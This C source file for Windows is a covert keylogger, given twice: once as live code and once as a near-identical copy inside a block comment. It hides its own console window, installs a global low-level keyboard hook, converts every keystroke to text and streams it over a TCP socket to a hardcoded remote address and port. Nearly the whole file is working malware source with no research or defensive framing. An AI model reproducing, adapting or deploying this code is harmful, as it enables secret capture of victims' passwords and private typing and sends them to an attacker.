#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <process.h> // For _beginthreadex

// Socket variables
SOCKET sock;
struct sockaddr_in server;

HHOOK hook; // Keyboard hook handle

// Function to initialize the Winsock library and establish a socket connection
int InitializeSocket(const char *serverIP, int port)
{
    WSADATA wsaData;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        printf("Failed to initialize Winsock.\n");
        return 0;
    }

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET)
    {
        printf("Failed to create socket.\n");
        WSACleanup();
        return 0;
    }

    // Set server details
    server.sin_addr.s_addr = inet_addr(serverIP);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    // Connect to the remote server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        printf("Failed to connect to the remote server.\n");
        closesocket(sock);
        WSACleanup();
        return 0;
    }

    return 1;
}

// Function to send data over the socket connection
int SendData(const char *data)
{
    if (send(sock, data, strlen(data), 0) < 0)
    {
        printf("Failed to send data.\n");
        closesocket(sock);
        WSACleanup();
        return 0;
    }

    return 1;
}

// Timer thread function
unsigned int __stdcall TimerThread(void *param)
{
    while (1)
    {
        // Log keystrokes to the remote machine
        SendData("\n");

        // Sleep for 5 seconds
        Sleep(5000);
    }

    return 0;
}

// Function to hide the console window
void Stealth()
{
    HWND Stealth;
    AllocConsole();                                    // Allocate a console window
    Stealth = FindWindowA("ConsoleWindowClass", NULL); // Find the console window
    ShowWindow(Stealth, 0);                            // Hide the console window
}

// Keyboard hook procedure
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
    {
        KBDLLHOOKSTRUCT *kbStruct = (KBDLLHOOKSTRUCT *)lParam; // Get the keyboard structure
        DWORD vkCode = kbStruct->vkCode;                       // Get the virtual key code
        char key[100];                                         // Array to store the key string

// Convert the virtual key code to the corresponding string
        switch (vkCode)
        {
        case VK_CANCEL:
            strcpy(key, "[Cancel]");
            break;
        case VK_SPACE:
            strcpy(key, " ");
            break;
        case VK_LCONTROL:
            strcpy(key, "[LCtrl]");
            break;
        case VK_RCONTROL:
            strcpy(key, "[RCtrl]");
            break;
        case VK_LMENU:
            strcpy(key, "[LAlt]");
            break;
        case VK_RMENU:
            strcpy(key, "[RAlt]");
            break;
        case VK_LWIN:
            strcpy(key, "[LWindows]");
            break;
        case VK_RWIN:
            strcpy(key, "[RWindows]");
            break;
        case VK_APPS:
            strcpy(key, "[Applications]");
            break;
        case VK_SNAPSHOT:
            strcpy(key, "[PrintScreen]");
            break;
        case VK_INSERT:
            strcpy(key, "[Insert]");
            break;
        case VK_PAUSE:
            strcpy(key, "[Pause]");
            break;
        case VK_VOLUME_MUTE:
            strcpy(key, "[VolumeMute]");
            break;
        case VK_VOLUME_DOWN:
            strcpy(key, "[VolumeDown]");
            break;
        case VK_VOLUME_UP:
            strcpy(key, "[VolumeUp]");
            break;
        case VK_SELECT:
            strcpy(key, "[Select]");
            break;
        case VK_HELP:
            strcpy(key, "[Help]");
            break;
        case VK_EXECUTE:
            strcpy(key, "[Execute]");
            break;
        case VK_DELETE:
            strcpy(key, "[Delete]");
            break;
        case VK_CLEAR:
            strcpy(key, "[Clear]");
            break;
        case VK_RETURN:
            strcpy(key, "[Enter]");
            break;
        case VK_BACK:
            strcpy(key, "[Backspace]");
            break;
        case VK_TAB:
            strcpy(key, "[Tab]");
            break;
        case VK_ESCAPE:
            strcpy(key, "[Escape]");
            break;
        case VK_LSHIFT:
            strcpy(key, "[LShift]");
            break;
        case VK_RSHIFT:
            strcpy(key, "[RShift]");
            break;
        case VK_CAPITAL:
            strcpy(key, "[CapsLock]");
            break;
        case VK_NUMLOCK:
            strcpy(key, "[NumLock]");
            break;
        case VK_SCROLL:
            strcpy(key, "[ScrollLock]");
            break;
        case VK_HOME:
            strcpy(key, "[Home]");
            break;
        case VK_END:
            strcpy(key, "[End]");
            break;
        case VK_PLAY:
            strcpy(key, "[Play]");
            break;
        case VK_ZOOM:
            strcpy(key, "[Zoom]");
            break;
        case VK_DIVIDE:
            strcpy(key, "[/]");
            break;
        case VK_MULTIPLY:
            strcpy(key, "[*]");
            break;
        case VK_SUBTRACT:
            strcpy(key, "[-]");
            break;
        case VK_ADD:
            strcpy(key, "[+]");
            break;
        case VK_PRIOR:
            strcpy(key, "[PageUp]");
            break;
        case VK_NEXT:
            strcpy(key, "[PageDown]");
            break;
        case VK_LEFT:
            strcpy(key, "[LArrow]");
            break;
        case VK_RIGHT:
            strcpy(key, "[RArrow]");
            break;
        case VK_UP:
            strcpy(key, "[UpArrow]");
            break;
        case VK_DOWN:
            strcpy(key, "[DownArrow]");
            break;
        case VK_NUMPAD0:
            strcpy(key, "[0]");
            break;
        case VK_NUMPAD1:
            strcpy(key, "[1]");
            break;
        case VK_NUMPAD2:
            strcpy(key, "[2]");
            break;
        case VK_NUMPAD3:
            strcpy(key, "[3]");
            break;
        case VK_NUMPAD4:
            strcpy(key, "[4]");
            break;
        case VK_NUMPAD5:
            strcpy(key, "[5]");
            break;
        case VK_NUMPAD6:
            strcpy(key, "[6]");
            break;
        case VK_NUMPAD7:
            strcpy(key, "[7]");
            break;
        case VK_NUMPAD8:
            strcpy(key, "[8]");
            break;
        case VK_NUMPAD9:
            strcpy(key, "[9]");
            break;
        case VK_F1:
            strcpy(key, "[F1]");
            break;
        case VK_F2:
            strcpy(key, "[F2]");
            break;
        case VK_F3:
            strcpy(key, "[F3]");
            break;
        case VK_F4:
            strcpy(key, "[F4]");
            break;
        case VK_F5:
            strcpy(key, "[F5]");
            break;
        case VK_F6:
            strcpy(key, "[F6]");
            break;
        case VK_F7:
            strcpy(key, "[F7]");
            break;
        case VK_F8:
            strcpy(key, "[F8]");
            break;
        case VK_F9:
            strcpy(key, "[F9]");
            break;
        case VK_F10:
            strcpy(key, "[F10]");
            break;
        case VK_F11:
            strcpy(key, "[F11]");
            break;
        case VK_F12:
            strcpy(key, "[F12]");
            break;
        case VK_F13:
            strcpy(key, "[F13]");
            break;
        case VK_F14:
            strcpy(key, "[F14]");
            break;
        case VK_F15:
            strcpy(key, "[F15]");
            break;
        case VK_F16:
            strcpy(key, "[F16]");
            break;
        case VK_F17:
            strcpy(key, "[F17]");
            break;
        case VK_F18:
            strcpy(key, "[F18]");
            break;
        case VK_F19:
            strcpy(key, "[F19]");
            break;
        case VK_F20:
            strcpy(key, "[F20]");
            break;
        case VK_F21:
            strcpy(key, "[F21]");
            break;
        case VK_F22:
            strcpy(key, "[F22]");
            break;
        case VK_F23:
            strcpy(key, "[F23]");
            break;
        case VK_F24:
            strcpy(key, "[F24]");
            break;
        case VK_OEM_2:
            if (GetAsyncKeyState(VK_SHIFT))
                strcpy(key, "?");
            else
                strcpy(key, "/");
            break;
        case VK_OEM_3:
            if (GetAsyncKeyState(VK_SHIFT))
                strcpy(key, "~");
            else
                strcpy(key, "`");
            break;
        case VK_OEM_4:
            if (GetAsyncKeyState(VK_SHIFT))
                strcpy(key, "{");
            else
                strcpy(key, "[");
            break;
        case VK_OEM_5:
            if (GetAsyncKeyState(VK_SHIFT))
                strcpy(key, "|");
            else
                strcpy(key, "\\");
            break;
        case VK_OEM_6:
            if (GetAsyncKeyState(VK_SHIFT))
                strcpy(key, "}");
            else
                strcpy(key, "]");
            break;
        case VK_OEM_7:
            if (GetAsyncKeyState(VK_SHIFT))
                strcpy(key, "\\");
            else
                strcpy(key, "'");
            break;
            break;
        case 0xBC: // comma
            if (GetAsyncKeyState(VK_SHIFT))
                strcpy(key, "<");
            else
                strcpy(key, ",");
            break;
        case 0xBE: // Period
            if (GetAsyncKeyState(VK_SHIFT))
                strcpy(key, ">");
            else
                strcpy(key, ".");
            break;
        case 0xBA: // Semi Colon same as VK_OEM_1
            if (GetAsyncKeyState(VK_SHIFT))
                strcpy(key, ":");
            else
                strcpy(key, ";");
            break;
        case 0xBD: // Minus
            if (GetAsyncKeyState(VK_SHIFT))
                strcpy(key, "_");
            else
                strcpy(key, "-");
            break;
        case 0xBB: // Equal
            if (GetAsyncKeyState(VK_SHIFT))
                strcpy(key, "+");
            else
                strcpy(key, "=");
            break;
        default:
            sprintf(key, "%c", MapVirtualKey(vkCode, MAPVK_VK_TO_CHAR));
            break;
        }

        // Log keystrokes to the remote machine
        SendData(key);
    }

    return CallNextHookEx(hook, code, wParam, lParam); // Pass the message to the next hook procedure
}

int main()
{
    Stealth(); // Hide the console window

    // Initialize the socket connection to the remote machine
    const char *serverIP = "192.168.0.20"; // Replace with the actual IP address of the remote machine
    int port = 9010;                       // Replace with the actual port number of the remote machine

    if (!InitializeSocket(serverIP, port))
    {
        return 1;
    }

    // Create a thread for the timer functionality
    HANDLE timerThread = (HANDLE)_beginthreadex(NULL, 0, TimerThread, NULL, 0, NULL);
    if (timerThread == NULL)
    {
        printf("Failed to create the timer thread.\n");
        return 1;
    }

    // Set the keyboard hook
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hook == NULL)
    {
        printf("Failed to set the keyboard hook.\n");
        return 1;
    }

    // Message loop to keep the program running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Cleanup and exit the program
    UnhookWindowsHookEx(hook);
    closesocket(sock);
    WSACleanup();
    return 0;
}


/*
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <process.h> // For _beginthreadex

// Socket variables
SOCKET sock;
struct sockaddr_in server;

HHOOK hook; // Keyboard hook handle

// Function to initialize the Winsock library and establish a socket connection
int InitializeSocket(const char *serverIP, int port)
{
    WSADATA wsaData;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        printf("Failed to initialize Winsock.\n");
        return 0;
    }

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET)
    {
        printf("Failed to create socket.\n");
        WSACleanup();
        return 0;
    }

    // Set server details
    server.sin_addr.s_addr = inet_addr(serverIP);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    // Connect to remote server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        printf("Failed to connect to the remote server.\n");
        closesocket(sock);
        WSACleanup();
        return 0;
    }

    return 1;
}

// Function to send data over the socket connection
int SendData(const char *data)
{
    if (send(sock, data, strlen(data), 0) < 0)
    {
        printf("Failed to send data.\n");
        closesocket(sock);
        WSACleanup();
        return 0;
    }

    return 1;
}

// Timer thread function
unsigned int __stdcall TimerThread(void *param)
{
    while (1)
    {
        // Log keystrokes to the remote machine
        SendData("\n");

        // Sleep for 5 seconds
        Sleep(5000);
    }

    return 0;
}

// Function to hide the console window
void Stealth()
{
    HWND Stealth;
    AllocConsole();                                    // Allocate a console window
    Stealth = FindWindowA("ConsoleWindowClass", NULL); // Find the console window
    ShowWindow(Stealth, 0);                            // Hide the console window
}

// Keyboard hook procedure
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
    {
        KBDLLHOOKSTRUCT *kbStruct = (KBDLLHOOKSTRUCT *)lParam; // Get the keyboard structure
        DWORD vkCode = kbStruct->vkCode;                       // Get the virtual key code
        char key[100];                                         // Array to store the key string

        // Convert the virtual key code to the corresponding string
        switch (vkCode)
        {
        case VK_CANCEL:
            strcpy(key, "[Cancel]");
            break;
        case VK_SPACE:
            strcpy(key, " ");
            break;
        case VK_LCONTROL:
            strcpy(key, "[LCtrl]");
            break;
        case VK_RCONTROL:
            strcpy(key, "[RCtrl]");
            break;
        case VK_LMENU:
            strcpy(key, "[LAlt]");
            break;
        case VK_RMENU:
            strcpy(key, "[RAlt]");
            break;
        case VK_LWIN:
            strcpy(key, "[LWindows]");
            break;
        case VK_RWIN:
            strcpy(key, "[RWindows]");
            break;
        case VK_APPS:
            strcpy(key, "[Applications]");
            break;
        case VK_SNAPSHOT:
            strcpy(key, "[PrintScreen]");
            break;
        case VK_INSERT:
            strcpy(key, "[Insert]");
            break;
        case VK_PAUSE:
            strcpy(key, "[Pause]");
            break;
        case VK_VOLUME_MUTE:
            strcpy(key, "[VolumeMute]");
            break;
        case VK_VOLUME_DOWN:
            strcpy(key, "[VolumeDown]");
            break;
        case VK_VOLUME_UP:
            strcpy(key, "[VolumeUp]");
            break;
        case VK_SELECT:
            strcpy(key, "[Select]");
            break;
        case VK_HELP:
            strcpy(key, "[Help]");
            break;
        case VK_EXECUTE:
            strcpy(key, "[Execute]");
            break;
        case VK_DELETE:
            strcpy(key, "[Delete]");
            break;
        case VK_CLEAR:
            strcpy(key, "[Clear]");
            break;
        case VK_RETURN:
            strcpy(key, "[Enter]");
            break;
        case VK_BACK:
            strcpy(key, "[Backspace]");
            break;
        case VK_TAB:
            strcpy(key, "[Tab]");
            break;
        case VK_ESCAPE:
            strcpy(key, "[Escape]");
            break;
        case VK_LSHIFT:
            strcpy(key, "[LShift]");
            break;
        case VK_RSHIFT:
            strcpy(key, "[RShift]");
            break;
        case VK_CAPITAL:
            strcpy(key, "[CapsLock]");
            break;
        case VK_NUMLOCK:
            strcpy(key, "[NumLock]");
            break;
        case VK_SCROLL:
            strcpy(key, "[ScrollLock]");
            break;
        case VK_HOME:
            strcpy(key, "[Home]");
            break;
        case VK_END:
            strcpy(key, "[End]");
            break;
        case VK_PLAY:
            strcpy(key, "[Play]");
            break;
        case VK_ZOOM:
            strcpy(key, "[Zoom]");
            break;
        case VK_DIVIDE:
            strcpy(key, "[/]");
            break;
        case VK_MULTIPLY:
            strcpy(key, "[*]");
            break;
        case VK_SUBTRACT:
            strcpy(key, "[-]");
            break;
        case VK_ADD:
            strcpy(key, "[+]");
            break;
        case VK_PRIOR:
            strcpy(key, "[PageUp]");
            break;
        case VK_NEXT:
            strcpy(key, "[PageDown]");
            break;
        case VK_LEFT:
            strcpy(key, "[LArrow]");
            break;
        case VK_RIGHT:
            strcpy(key, "[RArrow]");
            break;
        case VK_UP:
            strcpy(key, "[UpArrow]");
            break;
        case VK_DOWN:
            strcpy(key, "[DownArrow]");
            break;
        case VK_NUMPAD0:
            strcpy(key, "[0]");
            break;
        case VK_NUMPAD1:
            strcpy(key, "[1]");
            break;
        case VK_NUMPAD2:
            strcpy(key, "[2]");
            break;
        case VK_NUMPAD3:
            strcpy(key, "[3]");
            break;
        case VK_NUMPAD4:
            strcpy(key, "[4]");
            break;
        case VK_NUMPAD5:
            strcpy(key, "[5]");
            break;
        case VK_NUMPAD6:
            strcpy(key, "[6]");
            break;
        case VK_NUMPAD7:
            strcpy(key, "[7]");
            break;
        case VK_NUMPAD8:
            strcpy(key, "[8]");
            break;
        case VK_NUMPAD9:
            strcpy(key, "[9]");
            break;
        case VK_F1:
            strcpy(key, "[F1]");
            break;
        case VK_F2:
            strcpy(key, "[F2]");
            break;
        case VK_F3:
            strcpy(key, "[F3]");
            break;
        case VK_F4:
            strcpy(key, "[F4]");
            break;
        case VK_F5:
            strcpy(key, "[F5]");
            break;
        case VK_F6:
            strcpy(key, "[F6]");
            break;
        case VK_F7:
            strcpy(key, "[F7]");
            break;
        case VK_F8:
            strcpy(key, "[F8]");
            break;
        case VK_F9:
            strcpy(key, "[F9]");
            break;
        case VK_F10:
            strcpy(key, "[F10]");
            break;
        case VK_F11:
            strcpy(key, "[F11]");
            break;
        case VK_F12:
            strcpy(key, "[F12]");
            break;
        case VK_F13:
            strcpy(key, "[F13]");
            break;
        case VK_F14:
            strcpy(key, "[F14]");
            break;
        case VK_F15:
            strcpy(key, "[F15]");
            break;
        case VK_F16:
            strcpy(key, "[F16]");
            break;
        case VK_F17:
            strcpy(key, "[F17]");
            break;
        case VK_F18:
            strcpy(key, "[F18]");
            break;
        case VK_F19:
            strcpy(key, "[F19]");
            break;
        case VK_F20:
            strcpy(key, "[F20]");
            break;
        case VK_F21:
            strcpy(key, "[F21]");
            break;
        case VK_F22:
            strcpy(key, "[F22]");
            break;
        case VK_F23:
            strcpy(key, "[F23]");
            break;
        case VK_F24:
            strcpy(key, "[F24]");
            break;
        case VK_OEM_2:
            if (GetAsyncKeyState(VK_SHIFT))
                strcpy(key, "?");
            else
                strcpy(key, "/");
            break;
        case VK_OEM_3:
            if (GetAsyncKeyState(VK_SHIFT))
                strcpy(key, "~");
            else
                strcpy(key, "`");
            break;
        case VK_OEM_4:
            if (GetAsyncKeyState(VK_SHIFT))
                strcpy(key, "{");
            else
                strcpy(key, "[");
            break;
        case VK_OEM_5:
            if (GetAsyncKeyState(VK_SHIFT))
                strcpy(key, "|");
            else
                strcpy(key, "\\");
            break;
        case VK_OEM_6:
            if (GetAsyncKeyState(VK_SHIFT))
                strcpy(key, "}");
            else
                strcpy(key, "]");
            break;
        case VK_OEM_7:
            if (GetAsyncKeyState(VK_SHIFT))
                strcpy(key, "\\");
            else
                strcpy(key, "'");
            break;
            break;
        case 0xBC: // comma
            if (GetAsyncKeyState(VK_SHIFT))
                strcpy(key, "<");
            else
                strcpy(key, ",");
            break;
        case 0xBE: // Period
            if (GetAsyncKeyState(VK_SHIFT))
                strcpy(key, ">");
            else
                strcpy(key, ".");
            break;
        case 0xBA: // Semi Colon same as VK_OEM_1
            if (GetAsyncKeyState(VK_SHIFT))
                strcpy(key, ":");
            else
                strcpy(key, ";");
            break;
        case 0xBD: // Minus
            if (GetAsyncKeyState(VK_SHIFT))
                strcpy(key, "_");
            else
                strcpy(key, "-");
            break;
        case 0xBB: // Equal
            if (GetAsyncKeyState(VK_SHIFT))
                strcpy(key, "+");
            else
                strcpy(key, "=");
            break;
        default:
            sprintf(key, "%c", MapVirtualKey(vkCode, MAPVK_VK_TO_CHAR));
            break;
        }

        // Log keystrokes to the remote machine
        SendData(key);
    }

    return CallNextHookEx(hook, code, wParam, lParam); // Pass the message to the next hook procedure
}

int main()
{
    Stealth(); // Hide the console window

    // Initialize the socket connection to the remote machine
    const char *serverIP = "192.168.0.20"; // Replace with the actual IP address of the remote machine
    int port = 9010;                       // Replace with the actual port number of the remote machine

    if (!InitializeSocket(serverIP, port))
    {
        return 1;
    }

    // Create a thread for the timer functionality
    HANDLE timerThread = (HANDLE)_beginthreadex(NULL, 0, TimerThread, NULL, 0, NULL);
    if (timerThread == NULL)
    {
        printf("Failed to create the timer thread.\n");
        return 1;
    }

    // Set the keyboard hook
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hook == NULL)
    {
        printf("Failed to set the keyboard hook.\n");
        return 1;
    }

    // Message loop to keep the program running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Cleanup
    UnhookWindowsHookEx(hook);
    closesocket(sock);
    WSACleanup();
    WaitForSingleObject(timerThread, INFINITE);
    CloseHandle(timerThread);

    return 0;
}
*/